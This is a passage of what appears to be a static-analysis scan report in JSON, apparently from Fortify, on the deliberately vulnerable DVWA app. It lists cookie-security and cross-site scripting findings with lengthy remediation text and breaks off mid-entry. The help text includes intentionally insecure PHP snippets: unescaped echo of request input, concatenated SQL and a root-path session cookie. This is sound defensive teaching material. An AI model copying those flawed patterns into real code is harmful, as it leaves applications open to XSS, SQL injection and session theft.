            "text" : "Developers often set cookies to be accessible from the root context path (\"/\"). This exposes the cookie to all web applications on the domain. Because cookies often carry sensitive information such as session identifiers, sharing cookies across applications can cause a vulnerability in one application to compromise another application.\n\nExample 1:\nImagine you have a forum application deployed at http://communitypages.example.com/MyForum and the application sets a session ID cookie with path \"/\" when users log in to the forum.\n\nFor example:\n\n  setcookie(\"mySessionId\", getSessionID(), 0, \"/\", \"communitypages.example.com\", true, true);\n\n\nSuppose an attacker creates another application at http://communitypages.example.com/EvilSite and posts a link to this site on the forum. When a user of the forum clicks this link, the browser will send the cookie set by /MyForum to the application running at /EvilSite. By stealing the session ID, the attacker can compromise the account of any forum user that browsed to /EvilSite.\n\nIn addition to reading a cookie, it might be possible for attackers to perform a Cookie Poisoning attack by using /EvilSite to create its own overly broad cookie that overwrites the cookie from /MyForum.\n\nMake sure to set cookie paths to be as restrictive as possible.\n\nExample 2: The following code shows how to set the cookie path to \"/MyForum\" for the example in the Explanation section.\n\nsetcookie(\"mySessionId\", getSessionID(), 0, \"/MyForum\", \"communitypages.example.com\", true, true);\n\n\n\n\n\nFor more information, see http://192.168.65.213:8080/ssc/html/ssc/version/11/fix/4722/?engineType=SCA&issue=EA5C9997E7FC472C9EFF69FD6DF91901"
          },
          "properties" : {
            "tags" : [ "High" ],
            "precision" : "low"
          }
        }, {
          "id" : "4739",
          "shortDescription" : {
            "text" : "Cookie Security: Cookie not Sent Over SSL"
          },
          "fullDescription" : {
            "text" : "The program creates a cookie without setting the <code>Secure</code> flag to <code>true</code>\n\n\n"
          },
          "help" : {
            "text" : "Modern web browsers support a Secure flag for each cookie. If the flag is set, the browser will only send the cookie over HTTPS. Sending cookies over an unencrypted channel can expose them to network sniffing attacks, so the secure flag helps keep a cookie's value confidential. This is especially important if the cookie contains private data or carries a session identifier.\n  \n\nExample 1: The following code adds a cookie to the response without setting the Secure flag.\n\n...\nsetcookie(\"emailCookie\", $email, 0, \"/\", \"www.example.com\");\n...\n\n\nIf an application uses both HTTPS and HTTP, but does not set the Secure flag, cookies sent during an HTTPS request will also be sent during subsequent HTTP requests. Attackers may then compromise the cookie by sniffing the unencrypted network traffic, which is particularly easy over wireless networks.\n\nSet the Secure flag on all new cookies in order to instruct browsers not to send these cookies in the clear. This can be accomplished by passing true as the sixth argument to setcookie().\n\nExample 2: The following code corrects the mistake in Example 1 by setting the Secure flag to true.\n\n\nsetcookie(\"emailCookie\", $email, 0, \"/\", \"www.example.com\", TRUE);\n\n\n\n\n\nFor more information, see http://192.168.65.213:8080/ssc/html/ssc/version/11/fix/4739/?engineType=SCA&issue=F1B6264A617D3CA10E3F31E8DF4E0DC2"
          },
          "properties" : {
            "tags" : [ "Low" ],
            "precision" : "low"
          }
        }, {
          "id" : "4365",
          "shortDescription" : {
            "text" : "Cross-Site Scripting: Reflected"
          },
          "fullDescription" : {
            "text" : "Line 345 of dvwaPage.inc.php sends unvalidated data to a web browser, which can result in the browser executing malicious code.\n\n\n"
          },
          "help" : {
            "text" : "Cross-site scripting (XSS) vulnerabilities occur when:\n\n1. Data enters a web application through an untrusted source. In the case of reflected XSS, the untrusted source is typically a web request, while in the case of persisted (also known as stored) XSS it is typically a database or other back-end data store.\n\n\n2. The data is included in dynamic content that is sent to a web user without validation.\n\nIn this case, the data is sent at builtin_echo() in dvwaPage.inc.php on line 345.\n\nThe malicious content sent to the web browser often takes the form of a JavaScript segment, but can also include HTML, Flash or any other type of code that the browser executes. The variety of attacks based on XSS is almost limitless, but they commonly include transmitting private data such as cookies or other session information to the attacker, redirecting the victim to web content controlled by the attacker, or performing other malicious operations on the user's machine under the guise of the vulnerable site.\n\nExample 1: The following PHP code segment reads an employee ID, eid, from an HTTP request and displays it to the user.\n\n\n&lt;?php\n\t$eid = $_GET['eid'];\n\t...\n?&gt;\n...\n&lt;?php\n\techo \"Employee ID: $eid\";\n?&gt;\n\n\nThe code in this example operates correctly if eid contains only standard alphanumeric text. If eid has a value that includes metacharacters or source code, then the code is executed by the web browser as it displays the HTTP response.\n\nInitially this might not appear to be much of a vulnerability. After all, why would someone enter a URL that causes malicious code to run on their own computer? The real danger is that an attacker will create the malicious URL, then use email or social engineering tricks to lure victims into visiting a link to the URL. When victims click the link, they unwittingly reflect the malicious content through the vulnerable web application back to their own computers. This mechanism of exploiting vulnerable web applications is known as Reflected XSS.\n\nExample 2: The following PHP code segment queries a database for an employee with a given ID and prints the corresponding employee's name.\n\n\n&lt;?php...\n $con = mysql_connect($server,$user,$password);\n ...\n $result = mysql_query(\"select * from emp where id=\"+eid);\n $row = mysql_fetch_array($result)\n echo 'Employee name: ', mysql_result($row,0,'name');\n ...\n?&gt;\n\n\nAs in Example 1, this code functions correctly when the values of name are well-behaved, but it does nothing to prevent exploits if they are not. Again, this code can appear less dangerous because the value of name is read from a database, whose contents are apparently managed by the application. However, if the value of name originates from user-supplied data, then the database can be a conduit for malicious content. Without proper input validation on all data stored in the database, an attacker may execute malicious commands in the user's web browser. This type of exploit, known as Persistent (or Stored) XSS, is particularly insidious because the indirection caused by the data store makes it difficult to identify the threat and increases the possibility that the attack might affect multiple users. XSS got its start in this form with web sites that offered a \"guestbook\" to visitors. Attackers would include JavaScript in their guestbook entries, and all subsequent visitors to the guestbook page would execute the malicious code.\n\nAs the examples demonstrate, XSS vulnerabilities are caused by code that includes unvalidated data in an HTTP response. There are three vectors by which an XSS attack can reach a victim:\n\n- As in Example 1, data is read directly from the HTTP request and reflected back in the HTTP response. Reflected XSS exploits occur when an attacker causes a user to supply dangerous content to a vulnerable web application, which is then reflected back to the user and executed by the web browser. The most common mechanism for delivering malicious content is to include it as a parameter in a URL that is posted publicly or emailed directly to victims. URLs constructed in this manner constitute the core of many phishing schemes, whereby an attacker convinces victims to visit a URL that refers to a vulnerable site. After the site reflects the attacker's content back to the user, the content is executed and proceeds to transfer private information, such as cookies that might include session information, from the user's machine to the attacker or perform other nefarious activities.\n\n- As in Example 2, the application stores dangerous data in a database or other trusted data store. The dangerous data is subsequently read back into the application and included in dynamic content. Persistent XSS exploits occur when an attacker injects dangerous content into a data store that is later read and included in dynamic content. From an attacker's perspective, the optimal place to inject malicious content is in an area that is displayed to either many users or particularly interesting users. Interesting users typically have elevated privileges in the application or interact with sensitive data that is valuable to the attacker. If one of these users executes malicious content, the attacker may be able to perform privileged operations on behalf of the user or gain access to sensitive data belonging to the user.\n\n- A source outside the application stores dangerous data in a database or other data store, and the dangerous data is subsequently read back into the application as trusted data and included in dynamic content.\n\nThe solution to prevent XSS is to ensure that validation occurs in the required places and that relevant properties are set to prevent vulnerabilities.\n\nBecause XSS vulnerabilities occur when an application includes malicious data in its output, one logical approach is to validate data immediately before it leaves the application. However, because web applications often have complex and intricate code for generating dynamic content, this method is prone to errors of omission (missing validation). An effective way to mitigate this risk is to also perform input validation for XSS.\n\nWeb applications must validate all input to prevent other vulnerabilities, such as SQL injection, so augmenting an application's existing input validation mechanism to include checks for XSS is generally relatively easy. Despite its value, input validation for XSS does not take the place of rigorous output validation. An application might accept input through a shared data store or other trusted source, and that data store might accept input from a source that does not perform adequate input validation. Therefore, the application cannot implicitly rely on the safety of this or any other data. This means that the best way to prevent XSS vulnerabilities is to validate everything that enters the application and leaves the application destined for the user.\n\nThe most secure approach to validation for XSS is to create an allow list of safe characters that can appear in HTTP content and accept input composed exclusively of characters in the approved set. For example, a valid username might only include alphanumeric characters or a phone number might only include digits 0-9. However, this solution is often infeasible in web applications because many characters that have special meaning to the browser must be considered valid input after they are encoded, such as a web design bulletin board that must accept HTML fragments from its users.\n\nA more flexible, but less secure approach is to implement a deny list, which selectively rejects or escapes potentially dangerous characters before using the input. To form such a list, you first need to understand the set of characters that hold special meaning for web browsers. Although the HTML standard defines which characters have special meaning, many web browsers try to correct common mistakes in HTML and might treat other characters as special in certain contexts. This is why we do not recommend the use of deny lists as a means to prevent XSS. The CERT(R) Coordination Center at the Software Engineering Institute at Carnegie Mellon University provides the following details about special characters in various contexts [1]:\n\nIn the content of a block-level element (in the middle of a paragraph of text):\n\n- \"&lt;\" is special because it introduces a tag.\n\n- \"&amp;\" is special because it introduces a character entity.\n\n- \"&gt;\" is special because some browsers treat it as special, on the assumption that the author of the page intended to include an opening \"&lt;\", but omitted it in error.\n\nThe following principles apply to attribute values:\n\n- In attribute values enclosed in double quotes, the double quotes are special because they mark the end of the attribute value.\n\n- In attribute values enclosed in single quotes, the single quotes are special because they mark the end of the attribute value.\n\n- In attribute values without any quotes, white-space characters, such as space and tab, are special.\n\n- \"&amp;\" is special when used with certain attributes, because it introduces a character entity.\n\nIn URLs, for example, a search engine might provide a link within the results page that the user can click to re-run the search. This can be implemented by encoding the search query inside the URL, which introduces additional special characters:\n\n- Space, tab, and new line are special because they mark the end of the URL.\n\n- \"&amp;\" is special because it either introduces a character entity or separates CGI parameters.\n\n- Non-ASCII characters (that is, everything greater than 127 in the ISO-8859-1 encoding) are not allowed in URLs, so they are considered to be special in this context.\n\n- The \"%\" symbol must be filtered from input anywhere parameters encoded with HTTP escape sequences are decoded by server-side code. For example, \"%\" must be filtered if input such as \"%68%65%6C%6C%6F\" becomes \"hello\" when it appears on the web page.\n\n\nWithin the body of a &lt;SCRIPT&gt; &lt;/SCRIPT&gt;:\n\n- Semicolons, parentheses, curly braces, and new line characters must be filtered out in situations where text could be inserted directly into a pre-existing script tag.\n\nServer-side scripts:\n\n- Server-side scripts that convert any exclamation characters (!) in input to double-quote characters (\") on output might require additional filtering.\n\nOther possibilities:\n\n- If an attacker submits a request in UTF-7, the special character '&lt;' appears as '+ADw-' and might bypass filtering. If the output is included in a page that does not explicitly specify an encoding format, then some browsers try to intelligently identify the encoding based on the content (in this case, UTF-7).\n\nAfter you identify the correct points in an application to perform validation for XSS attacks and what special characters the validation should consider, the next challenge is to identify how your validation handles special characters. If special characters are not considered valid input to the application, then you can reject any input that contains special characters as invalid. A second option is to remove special characters with filtering. However, filtering has the side effect of changing any visual representation of the filtered content and might be unacceptable in circumstances where the integrity of the input must be preserved for display.\n\nIf input containing special characters must be accepted and displayed accurately, validation must encode any special characters to remove their significance. A complete list of ISO 8859-1 encoded values for special characters is provided as part of the official HTML specification [2].\n\nMany application servers attempt to limit an application's exposure to cross-site scripting vulnerabilities by providing implementations for the functions responsible for setting certain specific HTTP response content that perform validation for the characters essential to a cross-site scripting attack. Do not rely on the server running your application to make it secure. For any developed application, there are no guarantees about which application servers it will run on during its lifetime. As standards and known exploits evolve, there are no guarantees that application servers will continue to stay in sync.\n\n\n\n\nFor more information, see http://192.168.65.213:8080/ssc/html/ssc/version/11/fix/4365/?engineType=SCA&issue=0186C2C752F91C2A26B61E4A8DFA83D6"
          },
          "properties" : {
            "tags" : [ "Critical" ],
            "precision" : "high"
          }
        }, {
          "id" : "4434",
          "shortDescription" : {
            "text" : "Cross-Site Scripting: Persistent"
          },
          "fullDescription" : {
            "text" : "Line 345 of dvwaPage.inc.php sends unvalidated data to a web browser, which can result in the browser executing malicious code.\n\n\n"
          },
          "help" : {
            "text" : "Cross-site scripting (XSS) vulnerabilities occur when:\n\n1. Data enters a web application through an untrusted source. In the case of persistent (also known as stored) XSS, the untrusted source is typically a database or other back-end data store, while in the case of reflected XSS it is typically a web request.\n\n\nIn this case, the data enters at mysqli_query() in dvwaPage.inc.php on line 540.\n\n2. The data is included in dynamic content that is sent to a web user without validation.\n\nIn this case, the data is sent at builtin_echo() in dvwaPage.inc.php on line 345.\n\nThe malicious content sent to the web browser often takes the form of a JavaScript segment, but can also include HTML, Flash or any other type of code that the browser executes. The variety of attacks based on XSS is almost limitless, but they commonly include transmitting private data such as cookies or other session information to the attacker, redirecting the victim to web content controlled by the attacker, or performing other malicious operations on the user's machine under the guise of the vulnerable site.\n\nExample 1: The following PHP code segment queries a database for an employee with a given ID and prints the corresponding employee's name.\n\n\n&lt;?php...\n $con = mysql_connect($server,$user,$password);\n ...\n $result = mysql_query(\"select * from emp where id=\"+eid);\n $row = mysql_fetch_array($result)\n echo 'Employee name: ', mysql_result($row,0,'name');\n ...\n?&gt;\n\n\nThis code functions correctly when the values of name are well-behaved, but it does nothing to prevent exploits if they are not. This code can appear less dangerous because the value of name is read from a database, whose contents are apparently managed by the application. However, if the value of name originates from user-supplied data, then the database can be a conduit for malicious content. Without proper input validation on all data stored in the database, an attacker may execute malicious commands in the user's web browser. This type of exploit, known as Persistent (or Stored) XSS, is particularly insidious because the indirection caused by the data store makes it difficult to identify the threat and increases the possibility that the attack might affect multiple users. XSS got its start in this form with web sites that offered a \"guestbook\" to visitors. Attackers would include JavaScript in their guestbook entries, and all subsequent visitors to the guestbook page would execute the malicious code.\n\nExample 2: The following PHP code segment reads an employee ID, eid, from an HTTP request and displays it to the user.\n\n\n&lt;?php\n\t$eid = $_GET['eid'];\n\t...\n?&gt;\n...\n&lt;?php\n\techo \"Employee ID: $eid\";\n?&gt;\n\n\nAs in Example 1, this code operates correctly if eid contains only standard alphanumeric text. If eid has a value that includes metacharacters or source code, then the code is executed by the web browser as it displays the HTTP response.\n\nInitially this might not appear to be much of a vulnerability. After all, why would someone enter a URL that causes malicious code to run on their own computer? The real danger is that an attacker will create the malicious URL, then use email or social engineering tricks to lure victims into visiting a link to the URL. When victims click the link, they unwittingly reflect the malicious content through the vulnerable web application back to their own computers. This mechanism of exploiting vulnerable web applications is known as Reflected XSS.\n\nAs the examples demonstrate, XSS vulnerabilities are caused by code that includes unvalidated data in an HTTP response. There are three vectors by which an XSS attack can reach a victim:\n\n- As in Example 1, the application stores dangerous data in a database or other trusted data store. The dangerous data is subsequently read back into the application and included in dynamic content. Persistent XSS exploits occur when an attacker injects dangerous content into a data store that is later read and included in dynamic content. From an attacker's perspective, the optimal place to inject malicious content is in an area that is displayed to either many users or particularly interesting users. Interesting users typically have elevated privileges in the application or interact with sensitive data that is valuable to the attacker. If one of these users executes malicious content, the attacker may be able to perform privileged operations on behalf of the user or gain access to sensitive data belonging to the user.\n\n- As in Example 2, data is read directly from the HTTP request and reflected back in the HTTP response. Reflected XSS exploits occur when an attacker causes a user to supply dangerous content to a vulnerable web application, which is then reflected back to the user and executed by the web browser. The most common mechanism for delivering malicious content is to include it as a parameter in a URL that is posted publicly or emailed directly to victims. URLs constructed in this manner constitute the core of many phishing schemes, whereby an attacker convinces victims to visit a URL that refers to a vulnerable site. After the site reflects the attacker's content back to the user, the content is executed and proceeds to transfer private information, such as cookies that might include session information, from the user's machine to the attacker or perform other nefarious activities.\n\n- A source outside the application stores dangerous data in a database or other data store, and the dangerous data is subsequently read back into the application as trusted data and included in dynamic content.\n\nThe solution to prevent XSS is to ensure that validation occurs in the required places and that relevant properties are set to prevent vulnerabilities.\n\nBecause XSS vulnerabilities occur when an application includes malicious data in its output, one logical approach is to validate data immediately before it leaves the application. However, because web applications often have complex and intricate code for generating dynamic content, this method is prone to errors of omission (missing validation). An effective way to mitigate this risk is to also perform input validation for XSS.\n\nWeb applications must validate all input to prevent other vulnerabilities, such as SQL injection, so augmenting an application's existing input validation mechanism to include checks for XSS is generally relatively easy. Despite its value, input validation for XSS does not take the place of rigorous output validation. An application might accept input through a shared data store or other trusted source, and that data store might accept input from a source that does not perform adequate input validation. Therefore, the application cannot implicitly rely on the safety of this or any other data. This means that the best way to prevent XSS vulnerabilities is to validate everything that enters the application and leaves the application destined for the user.\n\nThe most secure approach to validation for XSS is to create an allow list of safe characters that can appear in HTTP content and accept input composed exclusively of characters in the approved set. For example, a valid username might only include alphanumeric characters or a phone number might only include digits 0-9. However, this solution is often infeasible in web applications because many characters that have special meaning to the browser must be considered valid input after they are encoded, such as a web design bulletin board that must accept HTML fragments from its users.\n\nA more flexible, but less secure approach is to implement a deny list, which selectively rejects or escapes potentially dangerous characters before using the input. To form such a list, you first need to understand the set of characters that hold special meaning for web browsers. Although the HTML standard defines which characters have special meaning, many web browsers try to correct common mistakes in HTML and might treat other characters as special in certain contexts. This is why we do not recommend the use of deny lists as a means to prevent XSS. The CERT(R) Coordination Center at the Software Engineering Institute at Carnegie Mellon University provides the following details about special characters in various contexts [1]:\n\nIn the content of a block-level element (in the middle of a paragraph of text):\n\n- \"&lt;\" is special because it introduces a tag.\n\n- \"&amp;\" is special because it introduces a character entity.\n\n- \"&gt;\" is special because some browsers treat it as special, on the assumption that the author of the page intended to include an opening \"&lt;\", but omitted it in error.\n\nThe following principles apply to attribute values:\n\n- In attribute values enclosed in double quotes, the double quotes are special because they mark the end of the attribute value.\n\n- In attribute values enclosed in single quotes, the single quotes are special because they mark the end of the attribute value.\n\n- In attribute values without any quotes, white-space characters, such as space and tab, are special.\n\n- \"&amp;\" is special when used with certain attributes, because it introduces a character entity.\n\nIn URLs, for example, a search engine might provide a link within the results page that the user can click to re-run the search. This can be implemented by encoding the search query inside the URL, which introduces additional special characters:\n\n- Space, tab, and new line are special because they mark the end of the URL.\n\n- \"&amp;\" is special because it either introduces a character entity or separates CGI parameters.\n\n- Non-ASCII characters (that is, everything greater than 127 in the ISO-8859-1 encoding) are not allowed in URLs, so they are considered to be special in this context.\n\n- The \"%\" symbol must be filtered from input anywhere parameters encoded with HTTP escape sequences are decoded by server-side code. For example, \"%\" must be filtered if input such as \"%68%65%6C%6C%6F\" becomes \"hello\" when it appears on the web page.\n\n\nWithin the body of a &lt;SCRIPT&gt; &lt;/SCRIPT&gt;:\n\n- Semicolons, parentheses, curly braces, and new line characters must be filtered out in situations where text could be inserted directly into a pre-existing script tag.\n\nServer-side scripts:\n\n- Server-side scripts that convert any exclamation characters (!) in input to double-quote characters (\") on output might require additional filtering.\n\nOther possibilities:\n\n- If an attacker submits a request in UTF-7, the special character '&lt;' appears as '+ADw-' and might bypass filtering. If the output is included in a page that does not explicitly specify an encoding format, then some browsers try to intelligently identify the encoding based on the content (in this case, UTF-7).\n\nAfter you identify the correct points in an application to perform validation for XSS attacks and what special characters the validation should consider, the next challenge is to identify how your validation handles special characters. If special characters are not considered valid input to the application, then you can reject any input that contains special characters as invalid. A second option is to remove special characters with filtering. However, filtering has the side effect of changing any visual representation of the filtered content and might be unacceptable in circumstances where the integrity of the input must be preserved for display.\n\nIf input containing special characters must be accepted and displayed accurately, validation must encode any special characters to remove their significance. A complete list of ISO 8859-1 encoded values for special characters is provided as part of the official HTML specification [2].\n\nMany application servers attempt to limit an application's exposure to cross-site scripting vulnerabilities by providing implementations for the functions responsible for setting certain specific HTTP response content that perform validation for the characters essential to a cross-site scripting attack. Do not rely on the server running your application to make it secure. For any developed application, there are no guarantees about which application servers it will run on during its lifetime. As standards and known exploits evolve, there are no guarantees that application servers will continue to stay in sync.\n\n\n\n\nFor more information, see http://192.168.65.213:8080/ssc/html/ssc/version/11/fix/4434/?engineType=SCA&issue=2DAB33EBEAB0E5EA5A5256201BAAEFE2"
          },
          "properties" : {
            "tags" : [ "Critical" ],
            "precision" : "high"
          }
        }, {
          "id" : "4455",
          "shortDescription" : {
            "text" : "Cross-Site Scripting: Reflected"
          },
          "fullDescription" : {
            "text" : "Line 345 of dvwaPage.inc.php sends unvalidated data to a web browser, which can result in the browser executing malicious code.\n\n\n"
          },
          "help" : {
            "text" : "Cross-site scripting (XSS) vulnerabilities occur when:\n\n1. Data enters a web application through an untrusted source. In the case of reflected XSS, the untrusted source is typically a web request, while in the case of persisted (also known as stored) XSS it is typically a database or other back-end data store.\n\n\n2. The data is included in dynamic content that is sent to a web user without validation.\n\nIn this case, the data is sent at builtin_echo() in dvwaPage.inc.php on line 345.\n\nThe malicious content sent to the web browser often takes the form of a JavaScript segment, but can also include HTML, Flash or any other type of code that the browser executes. The variety of attacks based on XSS is almost limitless, but they commonly include transmitting private data such as cookies or other session information to the attacker, redirecting the victim to web content controlled by the attacker, or performing other malicious operations on the user's machine under the guise of the vulnerable site.\n\nExample 1: The following PHP code segment reads an employee ID, eid, from an HTTP request and displays it to the user.\n\n\n&lt;?php\n\t$eid = $_GET['eid'];\n\t...\n?&gt;\n...\n&lt;?php\n\techo \"Employee ID: $eid\";\n?&gt;\n\n\nThe code in this example operates correctly if eid contains only standard alphanumeric text. If eid has a value that includes metacharacters or source code, then the code is executed by the web browser as it displays the HTTP response.\n\nInitially this might not appear to be much of a vulnerability. After all, why would someone enter a URL that causes malicious code to run on their own computer? The real danger is that an attacker will create the malicious URL, then use email or social engineering tricks to lure victims into visiting a link to the URL. When victims click the link, they unwittingly reflect the malicious content through the vulnerable web application back to their own computers. This mechanism of exploiting vulnerable web applications is known as Reflected XSS.\n\nExample 2: The following PHP code segment queries a database for an employee with a given ID and prints the corresponding employee's name.\n\n\n&lt;?php...\n $con = mysql_connect($server,$user,$password);\n ...\n $result = mysql_query(\"select * from emp where id=\"+eid);\n $row = mysql_fetch_array($result)\n echo 'Employee name: ', mysql_result($row,0,'name');\n ...\n?&gt;\n\n\nAs in Example 1, this code functions correctly when the values of name are well-behaved, but it does nothing to prevent exploits if they are not. Again, this code can appear less dangerous because the value of name is read from a database, whose contents are apparently managed by the application. However, if the value of name originates from user-supplied data, then the database can be a conduit for malicious content. Without proper input validation on all data stored in the database, an attacker may execute malicious commands in the user's web browser. This type of exploit, known as Persistent (or Stored) XSS, is particularly insidious because the indirection caused by the data store makes it difficult to identify the threat and increases the possibility that the attack might affect multiple users. XSS got its start in this form with web sites that offered a \"guestbook\" to visitors. Attackers would include JavaScript in their guestbook entries, and all subsequent visitors to the guestbook page would execute the malicious code.\n\nAs the examples demonstrate, XSS vulnerabilities are caused by code that includes unvalidated data in an HTTP response. There are three vectors by which an XSS attack can reach a victim:\n\n- As in Example 1, data is read directly from the HTTP request and reflected back in the HTTP response. Reflected XSS exploits occur when an attacker causes a user to supply dangerous content to a vulnerable web application, which is then reflected back to the user and executed by the web browser. The most common mechanism for delivering malicious content is to include it as a parameter in a URL that is posted publicly or emailed directly to victims. URLs constructed in this manner constitute the core of many phishing schemes, whereby an attacker convinces victims to visit a URL that refers to a vulnerable site. After the site reflects the attacker's content back to the user, the content is executed and proceeds to transfer private information, such as cookies that might include session information, from the user's machine to the attacker or perform other nefarious activities.\n\n- As in Example 2, the application stores dangerous data in a database or other trusted data store. The dangerous data is subsequently read back into the application and included in dynamic content. Persistent XSS exploits occur when an attacker injects dangerous content into a data store that is later read and included in dynamic content. From an attacker's perspective, the optimal place to inject malicious content is in an area that is displayed to either many users or particularly interesting users. Interesting users typically have elevated privileges in the application or interact with sensitive data that is valuable to the attacker. If one of these users executes malicious content, the attacker may be able to perform privileged operations on behalf of the user or gain access to sensitive data belonging to the user.\n\n- A source outside the application stores dangerous data in a database or other data store, and the dangerous data is subsequently read back into the application as trusted data and included in dynamic content.\n\nThe solution to prevent XSS is to ensure that validation occurs in the required places and that relevant properties are set to prevent vulnerabilities.\n\nBecause XSS vulnerabilities occur when an application includes malicious data in its output, one logical approach is to validate data immediately before it leaves the application. However, because web applications often have complex and intricate code for generating dynamic content, this method is prone to errors of omission (missing validation). An effective way to mitigate this risk is to also perform input validation for XSS.\n\nWeb applications must validate all input to prevent other vulnerabilities, such as SQL injection, so augmenting an application's existing input validation mechanism to include checks for XSS is generally relatively easy. Despite its value, input validation for XSS does not take the place of rigorous output validation. An application might accept input through a shared data store or other trusted source, and that data store might accept input from a source that does not perform adequate input validation. Therefore, the application cannot implicitly rely on the safety of this or any other data. This means that the best way to prevent XSS vulnerabilities is to validate everything that enters the application and leaves the application destined for the user.\n\nThe most secure approach to validation for XSS is to create an allow list of safe characters that can appear in HTTP content and accept input composed exclusively of characters in the approved set. For example, a valid username might only include alphanumeric characters or a phone number might only include digits 0-9. However, this solution is often infeasible in web applications because many characters that have special meaning to the browser must be considered valid input after they are encoded, such as a web design bulletin board that must accept HTML fragments from its users.\n\nA more flexible, but less secure approach is to implement a deny list, which selectively rejects or escapes potentially dangerous characters before using the input. To form such a list, you first need to understand the set of characters that hold special meaning for web browsers. Although the HTML standard defines which characters have special meaning, many web browsers try to correct common mistakes in HTML and might treat other characters as special in certain contexts. This is why we do not recommend the use of deny lists as a means to prevent XSS. The CERT(R) Coordination Center at the Software Engineering Institute at Carnegie Mellon University provides the following details about special characters in various contexts [1]:\n\nIn the content of a block-level element (in the middle of a paragraph of text):\n\n- \"&lt;\" is special because it introduces a tag.\n\n- \"&amp;\" is special because it introduces a character entity.\n\n- \"&gt;\" is special because some browsers treat it as special, on the assumption that the author of the page intended to include an opening \"&lt;\", but omitted it in error.\n\nThe following principles apply to attribute values:\n\n- In attribute values enclosed in double quotes, the double quotes are special because they mark the end of the attribute value.\n\n- In attribute values enclosed in single quotes, the single quotes are special because they mark the end of the attribute value.\n\n- In attribute values without any quotes, white-space characters, such as space and tab, are special.\n\n- \"&amp;\" is special when used with certain attributes, because it introduces a character entity.\n\nIn URLs, for example, a search engine might provide a link within the results page that the user can click to re-run the search. This can be implemented by encoding the search query inside the URL, which introduces additional special characters:\n\n- Space, tab, and new line are special because they mark the end of the URL.\n\n- \"&amp;\" is special because it either introduces a character entity or separates CGI parameters.\n\n- Non-ASCII characters (that is, everything greater than 127 in the ISO-8859-1 encoding) are not allowed in URLs, so they are considered to be special in this context.\n\n- The \"%\" symbol must be filtered from input anywhere parameters encoded with HTTP escape sequences are decoded by server-side code. For example, \"%\" must be filtered if input such as \"%68%65%6C%6C%6F\" becomes \"hello\" when it appears on the web page.\n\n\nWithin the body of a &lt;SCRIPT&gt; &lt;/SCRIPT&gt;:\n\n- Semicolons, parentheses, curly braces, and new line characters must be filtered out in situations where text could be inserted directly into a pre-existing script tag.\n\nServer-side scripts:\n\n- Server-side scripts that convert any exclamation characters (!) in input to double-quote characters (\") on output might require additional filtering.\n\nOther possibilities:\n\n- If an attacker submits a request in UTF-7, the special character '&lt;' appears as '+ADw-' and might bypass filtering. If the output is included in a page that does not explicitly specify an encoding format, then some browsers try to intelligently identify the encoding based on the content (in this case, UTF-7).\n\nAfter you identify the correct points in an application to perform validation for XSS attacks and what special characters the validation should consider, the next challenge is to identify how your validation handles special characters. If special characters are not considered valid input to the application, then you can reject any input that contains special characters as invalid. A second option is to remove special characters with filtering. However, filtering has the side effect of changing any visual representation of the filtered content and might be unacceptable in circumstances where the integrity of the input must be preserved for display.\n\nIf input containing special characters must be accepted and displayed accurately, validation must encode any special characters to remove their significance. A complete list of ISO 8859-1 encoded values for special characters is provided as part of the official HTML specification [2].\n\nMany application servers attempt to limit an application's exposure to cross-site scripting vulnerabilities by providing implementations for the functions responsible for setting certain specific HTTP response content that perform validation for the characters essential to a cross-site scripting attack. Do not rely on the server running your application to make it secure. For any developed application, there are no guarantees about which application servers it will run on during its lifetime. As standards and known exploits evolve, there are no guarantees that application servers will continue to stay in sync.\n\n\n\n\nFor more information, see http://192.168.65.213:8080/ssc/html/ssc/version/11/fix/4455/?engineType=SCA&issue=3D90F9CF8FFFCD4A324CA194B72F47ED"
          },
          "properties" : {
            "tags" : [ "Critical" ],
            "precision" : "high"
          }
        }, {
          "id" : "4470",
          "shortDescription" : {
            "text" : "Cross-Site Scripting: Reflected"
          },
          "fullDescription" : {
            "text" : "Line 345 of dvwaPage.inc.php sends unvalidated data to a web browser, which can result in the browser executing malicious code.\n\n\n"
          },
          "help" : {
            "text" : "Cross-site scripting (XSS) vulnerabilities occur when:\n\n1. Data enters a web application through an untrusted source. In the case of reflected XSS, the untrusted source is typically a web request, while in the case of persisted (also known as stored) XSS it is typically a database or other back-end data store.\n\n\n2. The data is included in dynamic content that is sent to a web user without validation.\n\nIn this case, the data is sent at builtin_echo() in dvwaPage.inc.php on line 345.\n\nThe malicious content sent to the web browser often takes the form of a JavaScript segment, but can also include HTML, Flash or any other type of code that the browser executes. The variety of attacks based on XSS is almost limitless, but they commonly include transmitting private data such as cookies or other session information to the attacker, redirecting the victim to web content controlled by the attacker, or performing other malicious operations on the user's machine under the guise of the vulnerable site.\n\nExample 1: The following PHP code segment reads an employee ID, eid, from an HTTP request and displays it to the user.\n\n\n&lt;?php\n\t$eid = $_GET['eid'];\n\t...\n?&gt;\n...\n&lt;?php\n\techo \"Employee ID: $eid\";\n?&gt;\n\n\nThe code in this example operates correctly if eid contains only standard alphanumeric text. If eid has a value that includes metacharacters or source code, then the code is executed by the web browser as it displays the HTTP response.\n\nInitially this might not appear to be much of a vulnerability. After all, why would someone enter a URL that causes malicious code to run on their own computer? The real danger is that an attacker will create the malicious URL, then use email or social engineering tricks to lure victims into visiting a link to the URL. When victims click the link, they unwittingly reflect the malicious content through the vulnerable web application back to their own computers. This mechanism of exploiting vulnerable web applications is known as Reflected XSS.\n\nExample 2: The following PHP code segment queries a database for an employee with a given ID and prints the corresponding employee's name.\n\n\n&lt;?php...\n $con = mysql_connect($server,$user,$password);\n ...\n $result = mysql_query(\"select * from emp where id=\"+eid);\n $row = mysql_fetch_array($result)\n echo 'Employee name: ', mysql_result($row,0,'name');\n ...\n?&gt;\n\n\nAs in Example 1, this code functions correctly when the values of name are well-behaved, but it does nothing to prevent exploits if they are not. Again, this code can appear less dangerous because the value of name is read from a database, whose contents are apparently managed by the application. However, if the value of name originates from user-supplied data, then the database can be a conduit for malicious content. Without proper input validation on all data stored in the database, an attacker may execute malicious commands in the user's web browser. This type of exploit, known as Persistent (or Stored) XSS, is particularly insidious because the indirection caused by the data store makes it difficult to identify the threat and increases the possibility that the attack might affect multiple users. XSS got its start in this form with web sites that offered a \"guestbook\" to visitors. Attackers would include JavaScript in their guestbook entries, and all subsequent visitors to the guestbook page would execute the malicious code.\n\nAs the examples demonstrate, XSS vulnerabilities are caused by code that includes unvalidated data in an HTTP response. There are three vectors by which an XSS attack can reach a victim:\n\n- As in Example 1, data is read directly from the HTTP request and reflected back in the HTTP response. Reflected XSS exploits occur when an attacker causes a user to supply dangerous content to a vulnerable web application, which is then reflected back to the user and executed by the web browser. The most common mechanism for delivering malicious content is to include it 